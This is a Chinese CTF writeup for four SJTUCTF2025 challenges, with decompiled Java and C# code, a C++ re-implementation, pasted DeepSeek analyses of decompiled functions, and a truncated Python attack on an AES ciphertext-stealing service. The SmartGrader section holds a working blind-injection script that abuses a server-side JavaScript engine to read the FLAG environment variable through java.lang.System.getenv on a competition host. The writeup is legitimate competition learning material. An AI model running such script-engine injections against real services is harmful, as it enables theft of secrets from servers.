---
title: SJTUCTF2025 Writeup (3)
date: 2025-04-07T01:45:14+08:00
tags:
  - CTF
mathjax: true
---


观前提示：本Writeup含有过量Deepseek The Flag的内容，建议谨慎观看




# SmartGrader
> 来试试我写的分数换算小工具吧！

评价：又是JS抽象时刻

先上`jd-gui`逆呗

```java
package BOOT-INF.classes.com.sjtuctf2025.smartgrader.controller;

import java.util.ArrayList;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import org.json.JSONArray;
import org.json.JSONObject;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
@RequestMapping({"/api"})
public class GraderController {
  @PostMapping({"/grader"})
  public ArrayList<String> grader(@RequestBody String body) {
    ArrayList<String> results = new ArrayList<>();
    try {
      JSONObject json = new JSONObject(body);
      JSONArray scores = json.getJSONArray("scores");
      JSONArray rules = json.getJSONArray("rules");
      if (rules.length() > 10) {
        System.out.println("Too many rules!");
        return results;
      } 
      for (int i = 0; i < scores.length(); i++) {
        Double score = Double.valueOf(scores.getDouble(i));
        results.add(grade(score, rules));
      } 
    } catch (Exception e) {
      System.out.println(e.getMessage());
    } 
    return results;
  }
  
  private String grade(Double score, JSONArray rules) {
    try {
      for (int i = 0; i < rules.length(); i++) {
        JSONObject rule = rules.getJSONObject(i);
        String leftSymbol = rule.getString("leftSymbol");
        String rightSymbol = rule.getString("rightSymbol");
        Double leftScore = Double.valueOf(rule.getDouble("leftScore"));
        Double rightScore = Double.valueOf(rule.getDouble("rightScore"));
        String grade = rule.getString("grade");
        if (script(score, leftSymbol, rightSymbol, leftScore, rightScore))
          return grade; 
      } 
    } catch (Exception e) {
      System.out.println(e.getMessage());
    } 
    return "N/A";
  }
  
  private boolean script(Double score, String leftSymbol, String rightSymbol, Double leftScore, Double rightScore) {
    if (leftSymbol.length() > 24 || rightSymbol.length() > 24) {
      System.out.println("Symbol too long!");
      return false;
    } 
    String expr = "(" + leftScore + leftSymbol + "x && x" + rightSymbol + rightScore + ")";
    ScriptEngineManager manager = new ScriptEngineManager();
    ScriptEngine engine = manager.getEngineByName("js");
    engine.put("x", score);
    try {
      Object result = engine.eval(expr);
      return result.toString().equals("true");
    } catch (Exception e) {
      System.out.println(e.getMessage());
      return false;
    } 
  }
}
```

逻辑相当简洁易懂，就是布尔盲注，让`"(" + leftScore + leftSymbol + "x && x" + rightSymbol + rightScore + ")"`透出flag，锁了可控字段的总长度

直接上payload了：

```js
(async()=>{
const alp="!#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~";
for(let i=30;i<60;i++){
    for(let j of alp){
        await 
        fetch("http://vm7rrcv8kfewvpve.instance.penguin.0ops.sjtu.cn:18080/api/grader", {
          "method": "POST",
          "headers": {
            "user-agent": "vscode-restclient",
            "content-type": "application/json"
          },
          "body": JSON.stringify({
            "scores": [
              1,
              2,
              3
            ],
            "rules": [
              {
                "leftSymbol": ",x=java.lang.System,",
                "rightSymbol": ".getenv('FLAG')["+i+"]<'"+j+"'+",
                "leftScore": 0,
                "rightScore": 0,
                "grade": "OK1"
              },
              {
                "leftSymbol": ");",
                "rightSymbol": ";true//",
                "leftScore": 0,
                "rightScore": 0,
                "grade": "OK2"
              }
            ]
          }
        )})
        .then(v=>v.json()).then(e=>{
            if(e[0]=="OK1"){
                console.log(i,j,"OK");
            }
        })
    }
}

})()


/*
00000000001111111111222222222233333333
0123456789012345678901234567890123456
0ops{Scr!Pt_ENgIN3_1S_DAnGerous_hhH}

*/
```

拼起来是
```plain
 +-+-leftScore                             rightScore-+-+
 | |                                                  | |
(0.0,x=java.lang.System,x && x.getenv('FLAG')[12]<'o'+0.0)
     |                 |      |                      | 
     +---leftSymbol----+      +-----rightSymbol------+
```



确实挺神人的，反正deepseek绝对想不到这个


# AreYouReady
> Donald J. Trump’s gonna Make America Great Again! But how?

简单的逆向，C#直接上ILSpy，阅读毫无难度：

```c#
public class Composition
{
	public delegate void Instrument(int P_0, int P_1);

	private readonly int[] states;

	private int secret;

	public readonly Instrument[] instruments;

	private readonly int STARTED = 1;

	private readonly int PROCEDING = 2;

	private readonly int FINISHED = 3;

	private readonly int PRELUDE = 1;

	private readonly int SOLO1 = 2;

	private readonly int DUET1 = 3;

	private readonly int TRIO1 = 4;

	private readonly int SOLO2 = 5;

	private readonly int DUET2 = 6;

	private readonly int TRIO2 = 7;

	private readonly int FINALE = 8;

	private int bit
	{
		get
		{
			if (!Debugger.IsAttached)
			{
				string? processPath = Environment.ProcessPath;
				if (processPath == null || processPath.EndsWith("AreYouReady.exe"))
				{
					return 1;
				}
			}
			return 0;
		}
	}

	private void Piano(int key, int value)
	{
		ref int reference = ref states[0];
		ref int reference2 = ref states[1];
		int num = states[1];
		int num2 = states[0];
		reference = num;
		reference2 = num2;
	}

	private void Guitar(int key, int value)
	{
		ref int reference = ref states[1];
		ref int reference2 = ref states[2];
		int num = states[2];
		int num2 = states[1] + states[2];
		reference = num;
		reference2 = num2;
	}

	private void Violin(int key, int value)
	{
		ref int reference = ref states[2];
		ref int reference2 = ref states[3];
		int num = states[3];
		int num2 = states[2] - states[3];
		reference = num;
		reference2 = num2;
	}

	private void Cello(int key, int value)
	{
		ref int reference = ref states[3];
		ref int reference2 = ref states[4];
		int num = states[4];
		int num2 = states[3] ^ states[4];
		reference = num;
		reference2 = num2;
	}

	private void Drum(int key, int value)
	{
		ref int reference = ref states[4];
		ref int reference2 = ref states[5];
		int num = states[5];
		int num2 = ~(states[4] ^ states[5]);
		reference = num;
		reference2 = num2;
	}

	private void Flute(int key, int value)
	{
		ref int reference = ref states[5];
		ref int reference2 = ref states[6];
		int num = states[6];
		int num2 = (states[5] << key) | (states[5] >>> 32 - key);
		reference = num;
		reference2 = num2;
	}

	private void Harp(int key, int value)
	{
		ref int reference = ref states[6];
		ref int reference2 = ref states[0];
		int num = states[0];
		int num2 = (states[6] << value) | (states[6] >>> 32 - value);
		reference = num;
		reference2 = num2;
	}

	private void Saxophone(int key, int value)
	{
		ref int reference = ref states[0];
		ref int reference2 = ref states[1];
		ref int reference3 = ref states[2];
		ref int reference4 = ref states[3];
		ref int reference5 = ref states[4];
		ref int reference6 = ref states[5];
		ref int reference7 = ref states[6];
		int num = states[1];
		int num2 = states[2];
		int num3 = states[3];
		int num4 = states[4];
		int num5 = states[5];
		int num6 = states[6];
		int num7 = states[0];
		reference = num;
		reference2 = num2;
		reference3 = num3;
		reference4 = num4;
		reference5 = num5;
		reference6 = num6;
		reference7 = num7;
	}

	protected virtual int GetHash(int P_0, int P_1)
	{
		int num = secret + (P_0 << P_1) - (P_1 << P_0);
		secret = num ^ (secret >> bit);
		return secret;
	}

	protected virtual void GoOn(int P_0, int P_1)
	{
		int num = (int)((uint)GetHash(P_0, P_1) % (uint)instruments.Length);
		instruments[num](P_0, P_1);
	}

	public static Composition New()
	{
		Composition composition = new Composition();
		composition.Initialize();
		return composition;
	}

	private Composition()
	{
		states = new int[7];
		instruments = new Instrument[8] { Piano, Guitar, Saxophone, Violin, Cello, Drum, Flute, Harp };
	}

	public override string ToString()
	{
		Span<int> span = stackalloc int[7];
		for (int i = 0; i < 7; i++)
		{
			span[i] = states[i] ^ (secret + i);
		}
		return Encoding.GetEncoding("us-ascii", new EncoderExceptionFallback(), new DecoderExceptionFallback()).GetString(MemoryMarshal.AsBytes(span));
	}

	private void Initialize()
	{
		ref int reference = ref states[0];
		ref int reference2 = ref states[1];
		ref int reference3 = ref states[2];
		ref int reference4 = ref states[3];
		ref int reference5 = ref states[4];
		ref int reference6 = ref states[5];
		ref int reference7 = ref states[6];
		reference = 503508867;
		reference2 = -744629298;
		reference3 = -794976596;
		reference4 = 1905074788;
		reference5 = -1713215966;
		reference6 = 1240041635;
		reference7 = -1999964094;
		secret = 424019476;
	}

	public void Prelude()
	{
		MessageBox.Show("Donald J. Trump’s gonna Make America Great Again!", "AreYouReady", MessageBoxButtons.OK, MessageBoxIcon.UserIcon);
		GoOn(STARTED, PRELUDE);
		MessageBox.Show("Obviously that will be great, but how?", "AreYouReady", MessageBoxButtons.OK, MessageBoxIcon.Question);
		GoOn(PROCEDING, PRELUDE);
		MessageBox.Show("With magic! So he and Elon Musk need a magician from ancient Asia to help them!", "AreYouReady", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		GoOn(FINISHED, PRELUDE);
		Solo1();
	}

	public void Solo1()
	{
		MessageBox.Show("Now they’ve found a perfect candidate...");
		GoOn(STARTED, SOLO1);
		MessageBox.Show("Lying straight...");
		GoOn(PROCEDING, SOLO1);
		MessageBox.Show("Outside the White House.", "AreYouReady", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		GoOn(FINISHED, SOLO1);
		Duet1();
	}

	public void Duet1()
	{
		MessageBox.Show("Are you ŗeadý?", "AreYouReady", MessageBoxButtons.OK, MessageBoxIcon.Question);
		GoOn(STARTED, DUET1);
		MessageBox.Show("Definitely, that’s you.", "AreYouReady", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		GoOn(PROCEDING, DUET1);
		MessageBox.Show("...");
		GoOn(FINISHED, DUET1);
		Trỉo1();
	}

	public void Trỉo1()
	{
		MessageBox.Show("It sounds interesting...");
		GoOn(STARTED, TRIO1);
		MessageBox.Show("Looking at the two with the greatest power in the world, you have no choice but to join them.", "AreYouReady", MessageBoxButtons.OK, MessageBoxIcon.UserIcon);
		GoOn(PROCEDING, TRIO1);
		MessageBox.Show("Several days have passed and they order you ţó perform a magic.");
		GoOn(FINISHED, TRIO1);
		Solo2();
	}

	public void Solo2()
	{
		MessageBox.Show("Performing a magic is easy for you.");
		GoOn(STARTED, SOLO2);
		MessageBox.Show("You decide to perform CTF: let someone hide the flag in advance, and then you uncover it.", "AreYouReady", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		GoOn(PROCEDING, SOLO2);
		MessageBox.Show("“Is it OK?” you ask them.", "AreYouReady", MessageBoxButtons.OK, MessageBoxIcon.Question);
		GoOn(FINISHED, SOLO2);
		Duet2();
	}

	public void Duet2()
	{
		MessageBox.Show("Certainly it’s approved, since everybody is interested in it.", "AreYouReady", MessageBoxButtons.OK, MessageBoxIcon.Question);
		GoOn(STARTED, DUET2);
		MessageBox.Show("Having seated, Tŗuńp and Musk are waiting exhaustedly.", "AreYouReady", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		GoOn(PROCEDING, DUET2);
		MessageBox.Show("Ensured as you are, you choose to do something mystical -");
		GoOn(FINISHED, DUET2);
		Trio2();
	}

	public void Trio2()
	{
		MessageBox.Show("Chanting loudly on the stage:");
		GoOn(STARTED, TRIO2);
		MessageBox.Show("Knowledge is power...");
		GoOn(PROCEDING, TRIO2);
		MessageBox.Show("...but not true power.");
		GoOn(FINISHED, TRIO2);
		Finale();
	}

	public void Finale()
	{
		MessageBox.Show("Reading is useful but not that useful.");
		GoOn(STARTED, FINALE);
		MessageBox.Show("2025 has come and we should abandon the outdated for the new!", "AreYouReady", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		GoOn(PROCEDING, FINALE);
		MessageBox.Show("Revealing the true power of magic! Here comes...", "AreYouReady", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		GoOn(FINISHED, FINALE);
		ShowFlag();
	}

	public void ShowFlag()
	{
		try
		{
			MessageBox.Show(ToString(), "Flag");
		}
		catch (DecoderFallbackException)
		{
			Thread.Sleep(1000);
			MessageBox.Show("Oops...There is something wrong. Maybe you can try again!", "Oops", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}
}
```

大意是说，有一堆state，还有一堆乐器，每个乐器都会对state敲敲打打；

然后程序每说一句话都要让乐器启动一下，

最后state肯定面目全非了，但它确实存了flag的值

我也不知道为什么它showflag那个toString会炸，~~可能这就是神秘的CSharp力量吧~~

反正拿C++重复一遍它的行为就正常了

PoC：
```cpp
#include<bits/stdc++.h>

int bit=1;//? maybe 0.


int STARTED = 1;
int PROCEDING = 2;
int FINISHED = 3;
int PRELUDE = 1;
int SOLO1 = 2;
int DUET1 = 3;
int TRIO1 = 4;
int SOLO2 = 5;
int DUET2 = 6;
int TRIO2 = 7;
int FINALE = 8;
int states[7]={503508867,
-744629298,
-794976596,
1905074788,
-1713215966,
1240041635,
-1999964094};
int secret = 424019476;

int GetHash(int P_0, int P_1)
{
	int num = secret + (P_0 << P_1) - (P_1 << P_0);
	secret = num ^ (secret >> bit);
	return secret;
}

void Drum(int key, int value)
{
	int num = states[5];
	int num2 = ~(states[4] ^ states[5]);
	states[4] = num;
	states[5] = num2;
}

void Piano(int key, int value)
{
	int num = states[1];
	int num2 = states[0];
	states[0] = num;
	states[1] = num2;
}

void Guitar(int key, int value)
{
	int num = states[2];
	int num2 = states[1] + states[2];
	states[1] = num;
	states[2] = num2;
}


void Harp(int key, int value)
{
	int num = states[0];
	int num2 = (states[6] << value) | ((unsigned int)states[6] >> 32 - value);// This may be wrong.
	states[6] = num;
	states[0] = num2;
}

void Saxophone(int key, int value)
{
	int num = states[1];
	int num2 = states[2];
	int num3 = states[3];
	int num4 = states[4];
	int num5 = states[5];
	int num6 = states[6];
	int num7 = states[0];
	states[0] = num;
	states[1] = num2;
	states[2] = num3;
	states[3] = num4;
	states[4] = num5;
	states[5] = num6;
	states[6] = num7;
}

void Violin(int key, int value)
{
	int num = states[3];
	int num2 = states[2] - states[3];
	states[2] = num;
	states[3] = num2;
}
void Cello(int key, int value)
{
	int num = states[4];
	int num2 = states[3] ^ states[4];
	states[3] = num;
	states[4] = num2;
}

void Flute(int key, int value)
{
	int num = states[6];
	int num2 = (states[5] << key) | ((unsigned int)states[5] >> 32 - key);// This may be wrong.
	states[5] = num;
	states[6] = num2;
}



void (*instruments[])(int, int) =  { Piano, Guitar, Saxophone, Violin, Cello, Drum, Flute, Harp };

void GoOn(int P_0, int P_1)
{
	int num = (int)(GetHash(P_0, P_1) % 8);
	instruments[num](P_0, P_1);
}


int main(){
	GoOn(STARTED, PRELUDE);
		GoOn(PROCEDING, PRELUDE);
		GoOn(FINISHED, PRELUDE);

        GoOn(STARTED, SOLO1);   
        GoOn(PROCEDING, SOLO1);
        GoOn(FINISHED, SOLO1);

        GoOn(STARTED, DUET1);
        GoOn(PROCEDING, DUET1);
        GoOn(FINISHED, DUET1);

        GoOn(STARTED, TRIO1);
        GoOn(PROCEDING, TRIO1);
        GoOn(FINISHED, TRIO1);

        GoOn(STARTED, SOLO2);
        GoOn(PROCEDING, SOLO2);
        GoOn(FINISHED, SOLO2);

        GoOn(STARTED, DUET2);
        GoOn(PROCEDING, DUET2);
        GoOn(FINISHED, DUET2);

        GoOn(STARTED, TRIO2);
        GoOn(PROCEDING, TRIO2);
        GoOn(FINISHED, TRIO2);

        GoOn(STARTED, FINALE);
        GoOn(PROCEDING, FINALE);
        GoOn(FINISHED, FINALE);
int span[7]={0};
		for (int i = 0; i < 7; i++)
		{
			span[i] = states[i] ^ (secret + i);
		}
    for(int i = 0; i < 7; i++)
    {
        std::cout << span[i] << std::endl;
    }
	return 0;
}


/*

1936748336 73706f30 spo0 0ops
1701336187 6568547b ehT{ {The
1143170926 4423676e D#gn ng#D
1266448225 4b7c7761 K|wa aw|K
611213687  246e6177 $naw wan$
1785685320 6a6f6548 joeH Heoj
32113      7d71     }q   q}


0ops{Theng#Daw|Kwan$Heojq}

Right. But what is it mean?
*/
```

# Expr-Warmup
> 算术小课堂开课了
> 
> 难度定位：入门/简单

直接爆逆，逆完之后你就deepseek吧活爹

Deepseek time:

> 判断以下代码在做什么：
> ```cpp
> double *__fastcall sub_39D5(double *a1, double *a2, double *a3)
> {
>   *a1 = a2[1] * a3[2] - a2[2] * a3[1];
>   a1[1] = a2[2] * *a3 - *a2 * a3[2];
>   a1[2] = *a2 * a3[1] - a2[1] * *a3;
>   return a1;
> }
> ```


这段代码实现了两个三维向量的叉乘（向量积）运算。具体分析如下：

1. **函数功能**：
   • 输入两个三维向量 `a2` 和 `a3`，计算它们的叉乘结果，并将结果存储在 `a1` 指向的内存中。
   • 返回结果向量 `a1` 的指针。

2. **数学表达式**：
   叉乘结果的三个分量按如下方式计算：
   • 第一个分量：`a1[0] = a2[1] * a3[2] - a2[2] * a3[1]`
   • 第二个分量：`a1[1] = a2[2] * a3[0] - a2[0] * a3[2]`
   • 第三个分量：`a1[2] = a2[0] * a3[1] - a2[1] * a3[0]`

   这与标准的三维向量叉乘公式完全一致：
   $$
   \mathbf{c} = \mathbf{a} \times \mathbf{b} = \begin{pmatrix}
   a_y b_z - a_z b_y \\
   a_z b_x - a_x b_z \\
   a_x b_y - a_y b_x
   \end{pmatrix}
   $$

3. **参数解释**：
   • `a2` 和 `a3`：输入向量的指针，分别对应公式中的 \(\mathbf{a}\) 和 \(\mathbf{b}\)。
   • `a1`：输出向量的指针，存储计算结果 \(\mathbf{c}\)。

4. **调用约定**：
   • 使用 `__fastcall` 约定（可能通过寄存器传递参数，提升性能），但不影响函数的核心逻辑。

**总结**：该函数接收两个三维向量 `a2` 和 `a3`，计算它们的叉乘并将结果写入 `a1`，最终返回 `a1` 的指针。这是三维几何运算中标准的叉乘实现。


> 此外，你还知道sub_38FE是向量赋值，sub_37EE是初始化函数，请说出下面代码在干什么：
> ```cpp
> bool __fastcall sub_2711(__int64 a1, __int64 a2)
> {
>   char v3[32]; // [rsp+10h] [rbp-C0h] BYREF
>   char v4[32]; // [rsp+30h] [rbp-A0h] BYREF
>   char v5[8]; // [rsp+50h] [rbp-80h] BYREF
>   double v6; // [rsp+58h] [rbp-78h]
>   double v7; // [rsp+60h] [rbp-70h]
>   double v8[4]; // [rsp+70h] [rbp-60h] BYREF
>   double v9[4]; // [rsp+90h] [rbp-40h] BYREF
>   double v10[4]; // [rsp+B0h] [rbp-20h] BYREF
> 
>   *(_QWORD *)&v10[3] = __readfsqword(0x28u);
>   sub_37EE(v3);
>   sub_37EE(v4);
>   sub_37EE(v5);
>   sub_38FE(v8, 1.0, 0.0, 0.0);
>   sub_38FE(v9, 0.0, 1.0, 0.0);
>   sub_38FE(v10, 0.0, 0.0, 1.0);
>   sub_39D5(v3, v9, v10);
>   sub_39D5(v4, v8, a2);
>   sub_39D5(v5, v4, v3);
>   return fabs(v6 / v7 - *(double *)(a1 + 8) * *(double *)(a1 + 8) / (*(double *)(a1 + 16) * *(double *)(a1 + 16))) < 9.999999999999999e-12;
> }
> ```



根据代码和上下文信息，这段函数 **`sub_2711`** 的功能是 **验证某个几何条件是否成立**，具体分析如下：

**关键步骤解析**

1. **初始化与标准基向量**：
   • `v8 = (1.0, 0.0, 0.0)`（x轴单位向量）
   • `v9 = (0.0, 1.0, 0.0)`（y轴单位向量）
   • `v10 = (0.0, 0.0, 1.0)`（z轴单位向量）

2. **向量叉乘操作**：
   • **`v3 = v9 × v10`**  
     结果为 `(1.0, 0.0, 0.0)`（即x轴单位向量）。
   • **`v4 = v8 × a2`**  
     计算x轴与参数向量 `a2` 的叉乘，结果 `v4` 垂直于x轴和 `a2` 构成的平面。
   • **`v5 = v4 × v3`**  
     再次叉乘x轴单位向量，结果 `v5` 的物理意义为 **`a2` 在垂直于x轴的平面（yz平面）上的投影**。

3. **缓冲区溢出导致变量覆盖**：
   • `v5` 定义为 `char[8]`（仅能容纳1个`double`），但叉乘结果写入3个`double`（24字节），导致后续变量 `v6` 和 `v7` 被覆盖：
     ◦ `v6 = v5[1]`（叉乘结果的y分量）
     ◦ `v7 = v5[2]`（叉乘结果的z分量）

4. **最终条件判断**：
   • 比较 `v6 / v7` 与从 `a1` 中提取的参数的平方比是否近似相等：
     ```c
     fabs(v6 / v7 - (*(a1+8)^2 / *(a1+16)^2)) < 1e-12
     ```
   • 这相当于验证 **`a2` 的投影在yz平面上的分量比 `(y/z)` 是否满足特定条件**，例如椭球方程中的归一化比例。

**参数与功能总结**

• **输入**：
  • `a1`: 可能指向一个包含几何参数的结构体（如椭球半轴长度 `b` 和 `c`，存储在 `a1+8` 和 `a1+16`）。
  • `a2`: 待验证的三维向量。
• **输出**：
  • 返回 `true` 表示 `a2` 满足预设的几何条件（如属于某个椭球面或双曲面），否则返回 `false`。


**数学意义**

代码验证了以下关系是否成立：
$$
\frac{y^2}{b^2} \approx \frac{z^2}{c^2}
$$
其中 `y` 和 `z` 是 `a2` 在yz平面投影的分量，`b` 和 `c` 是来自 `a1` 的参数。这可能用于检查 **`a2` 是否位于某个二次曲面（如双曲面或椭圆柱面）上**。

 **总结**

此函数通过叉乘运算和缓冲区溢出的副作用，验证输入向量 `a2` 的几何特性是否符合 `a1` 中定义的参数条件，最终返回布尔结果。代码可能用于图形学、物理引擎或几何库中的约束检查。


> 以下代码做了什么：
> ```cpp
> unsigned __int64 __fastcall Expr::processToken(__int64 a1, __int64 a2)
> {
>   std::invalid_argument *exception; // rbx
>   std::invalid_argument *v3; // rbx
>   std::invalid_argument *v4; // rbx
>   std::invalid_argument *v5; // rbx
>   std::invalid_argument *v6; // rbx
>   std::invalid_argument *v7; // rbx
>   double v9; // [rsp+20h] [rbp-70h] BYREF
>   double v10; // [rsp+28h] [rbp-68h]
>   double v11; // [rsp+30h] [rbp-60h]
>   double v12; // [rsp+38h] [rbp-58h]
>   double x; // [rsp+40h] [rbp-50h]
>   double v14; // [rsp+48h] [rbp-48h]
>   double v15; // [rsp+50h] [rbp-40h]
>   double v16; // [rsp+58h] [rbp-38h]
>   double v17; // [rsp+60h] [rbp-30h]
>   double v18; // [rsp+68h] [rbp-28h]
>   double v19; // [rsp+70h] [rbp-20h]
>   unsigned __int64 v20; // [rsp+78h] [rbp-18h]
> 
>   v20 = __readfsqword(0x28u);
>   switch ( *(_BYTE *)std::string::operator[](a2, 0LL) )
>   {
>     case 'a':
>       std::stack<double>::push(a1, a1 + 80);
>       break;
>     case 'b':
>       std::stack<double>::push(a1, a1 + 88);
>       break;
>     case 'c':
>       std::stack<double>::push(a1, a1 + 96);
>       break;
>     case 'd':
>       if ( (unsigned __int64)std::stack<double>::size(a1) <= 1 )
>       {
>         exception = (std::invalid_argument *)__cxa_allocate_exception(0x10uLL);
>         std::invalid_argument::invalid_argument(exception, "Error: Stack underflow");
>         __cxa_throw(
>           exception,
>           (struct type_info *)&`typeinfo for'std::invalid_argument,
>           (void (__fastcall *)(void *))&std::invalid_argument::~invalid_argument);
>       }
>       v18 = *(double *)std::stack<double>::top(a1);
>       std::stack<double>::pop(a1);
>       v19 = *(double *)std::stack<double>::top(a1);
>       std::stack<double>::pop(a1);
>       v9 = v19 / v18;
>       std::stack<double>::push(a1, &v9);
>       break;
>     case 'm':
>       if ( (unsigned __int64)std::stack<double>::size(a1) <= 1 )
>       {
>         v3 = (std::invalid_argument *)__cxa_allocate_exception(0x10uLL);
>         std::invalid_argument::invalid_argument(v3, "Error: Stack underflow");
>         __cxa_throw(
>           v3,
>           (struct type_info *)&`typeinfo for'std::invalid_argument,
>           (void (__fastcall *)(void *))&std::invalid_argument::~invalid_argument);
>       }
>       v16 = *(double *)std::stack<double>::top(a1);
>       std::stack<double>::pop(a1);
>       v17 = *(double *)std::stack<double>::top(a1);
>       std::stack<double>::pop(a1);
>       v9 = v17 - v16;
>       std::stack<double>::push(a1, &v9);
>       break;
>     case 'p':
>       if ( (unsigned __int64)std::stack<double>::size(a1) <= 1 )
>       {
>         v4 = (std::invalid_argument *)__cxa_allocate_exception(0x10uLL);
>         std::invalid_argument::invalid_argument(v4, "Error: Stack underflow");
>         __cxa_throw(
>           v4,
>           (struct type_info *)&`typeinfo for'std::invalid_argument,
>           (void (__fastcall *)(void *))&std::invalid_argument::~invalid_argument);
>       }
>       v14 = *(double *)std::stack<double>::top(a1);
>       std::stack<double>::pop(a1);
>       v15 = *(double *)std::stack<double>::top(a1);
>       std::stack<double>::pop(a1);
>       v9 = v15 + v14;
>       std::stack<double>::push(a1, &v9);
>       break;
>     case 'r':
>       if ( (unsigned __int8)std::stack<double>::empty(a1) )
>       {
>         v5 = (std::invalid_argument *)__cxa_allocate_exception(0x10uLL);
>         std::invalid_argument::invalid_argument(v5, "Error: Stack underflow");
>         __cxa_throw(
>           v5,
>           (struct type_info *)&`typeinfo for'std::invalid_argument,
>           (void (__fastcall *)(void *))&std::invalid_argument::~invalid_argument);
>       }
>       x = *(double *)std::stack<double>::top(a1);
>       std::stack<double>::pop(a1);
>       v9 = sqrt(x);
>       std::stack<double>::push(a1, &v9);
>       break;
>     case 's':
>       if ( (unsigned __int8)std::stack<double>::empty(a1) )
>       {
>         v6 = (std::invalid_argument *)__cxa_allocate_exception(0x10uLL);
>         std::invalid_argument::invalid_argument(v6, "Error: Stack underflow");
>         __cxa_throw(
>           v6,
>           (struct type_info *)&`typeinfo for std::invalid_argument,
>           (void (__fastcall *)(void *))&std::invalid_argument::~invalid_argument);
>       }
>       v12 = *(double *)std::stack<double>::top(a1);
>       std::stack<double>::pop(a1);
>       v9 = v12 * v12;
>       std::stack<double>::push(a1, &v9);
>       break;
>     case 'x':
>       if ( (unsigned __int64)std::stack<double>::size(a1) <= 1 )
>       {
>         v7 = (std::invalid_argument *)__cxa_allocate_exception(0x10uLL);
>         std::invalid_argument::invalid_argument(v7, "Error: Stack underflow");
>         __cxa_throw(
>           v7,
>           (struct type_info *)&`typeinfo for'std::invalid_argument,
>           (void (__fastcall *)(void *))&std::invalid_argument::~invalid_argument);
>       }
>       v10 = *(double *)std::stack<double>::top(a1);
>       std::stack<double>::pop(a1);
>       v11 = *(double *)std::stack<double>::top(a1);
>       std::stack<double>::pop(a1);
>       v9 = v11 * v10;
>       std::stack<double>::push(a1, &v9);
>       break;
>     default:
>       v9 = std::stod(a2, 0LL);
>       std::stack<double>::push(a1, &v9);
>       break;
>   }
>   return v20 - __readfsqword(0x28u);
> }
> ```


这段代码实现了一个基于栈的表达式求值器，用于处理不同的操作符和操作数，支持变量、算术运算及数学函数。以下是详细分析：

1. **函数作用**：
   • 处理表达式中的各个token（符号），根据不同的字符执行相应的操作，包括变量压栈、算术运算和数学函数计算，使用栈结构存储中间结果。

2. **参数与结构**：
   • `a1`：指向`Expr`类实例的指针，包含操作数栈及成员变量（如a、b、c）。
   • `a2`：字符串参数，表示当前处理的token。

3. **主要逻辑（switch-case）**：
   • **变量压栈**（'a', 'b', 'c'）：
     ◦ 将`a1`偏移地址（+80, +88, +96）的double值压入栈，可能对应类中的预定义变量。
   • **除法操作（'d'）**：
     ◦ 检查栈大小≥2，弹出两个值计算`次顶值 / 栈顶值`，结果压栈。
   • **减法（'m'）**：
     ◦ 弹出两个值计算`次顶值 - 栈顶值`，结果压栈。
   • **加法（'p'）**：
     ◦ 弹出两个值相加，结果压栈。
   • **平方根（'r'）**：
     ◦ 检查栈非空，弹出栈顶值计算平方根，结果压栈。
   • **平方（'s'）**：
     ◦ 弹出栈顶值计算平方，结果压栈。
   • **乘法（'x'）**：
     ◦ 弹出两个值相乘，结果压栈。
   • **默认处理**：
     ◦ 将token转换为double数值压栈。

4. **错误处理**：
   • 操作前检查栈是否满足所需操作数数量，否则抛出`std::invalid_argument`异常，提示"Stack underflow"。

5. **栈安全机制**：
   • 使用`__readfsqword(0x28u)`进行栈溢出保护，但此部分不影响核心逻辑。

**总结**：该函数模拟逆波兰表达式求值，处理变量、数值及运算符，利用栈结构维护中间结果，适用于实现计算器或表达式解析功能，确保在操作数不足时抛出异常保证健壮性。

-----

到这里就很好懂了

```
➜  sjtuctf--expr-warmup nc instance.penguin.0ops.sjtu.cn 18496
> a s
> b s
> c s
0ops{1'm_le4rNiNg_reVEr$e_And_math_iN_SJ7UcTF2025}
```

# AnatahEtodokuSakebi
> shout out your inner thoughts!!!!! maybe encrypted with AES...

这一题是deepseek大失败题，所以PoC是我手写的（（

```py
import requests
import time
from hashlib import md5
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# 配置参数
s = "Give me! It's MyFLAG!!!!!"# len=25
key = b"UZhyYC6oiNH2IDZE"
iv = b"sjtuctf20250oops"

# 生成时间戳和明文
current_time = int(time.time())
valid_timestamp = current_time // 600 * 600
plaintext = s + str(valid_timestamp) #len=30


def crackGoodData(afterw,encryptedBlockA,okstart):
    hij = AES.new(b"UZhyYC6oiNH2IDZE", AES.MODE_ECB)
    for i in range(0,255):
        for j in range(0,255):
            for k in range(0,255):
                if(AES.new(b"UZhyYC6oiNH2IDZE", AES.MODE_CBC, encryptedBlockA).decrypt(hij.encrypt(bytes([i,j,k])+afterw)).decode("latin1").startswith(okstart)):
                    return bytes([i,j,k])



print(plaintext)
class AESCryptService:
    key = b"UZhyYC6oiNH2IDZE"
    iv = b"sjtuctf20250oops"
    BLOC = 16

    def decrypt(self, data: str):
        data = bytes.fromhex(data)
        pad = 0
        key = self.key
        iv = self.iv
        BLOC = self.BLOC
        if (len(data) % BLOC) > 0:
            
            pad = BLOC - (len(data) % BLOC)
            secondToLast = data[len(data) - 2 * BLOC + pad : len(data) - BLOC + pad]
            "input: wwwlllllllllllll ???"
            dec = AES.new(key, AES.MODE_ECB).decrypt(secondToLast)
            # dec = "xxxppppppppppppp"
            data += bytes(dec[len(dec) - pad : len(dec)])
            # data = "wwwlllllllllllll ???ppppppppppppp"
            data = (
                data[: len(data) - 2 * BLOC]
                + data[len(data) - BLOC :]
                + data[len(data) - 2 * BLOC : len(data) - BLOC]
            )
            # data = "rrrppppppppppppp wwwlllllllllllll"
            # dec  = "FLAGFLAGFLGAFLAG 000?????????????"
            # encrypt(???lllllllllllll)=rrrppppppppppppp  MODE_ECB
            # encrypt(FLAGFLAGFLGAFLAG)=rrrppppppppppppp
            # encrypt(000?????????????)=wwwlllllllllllll

        index = 0
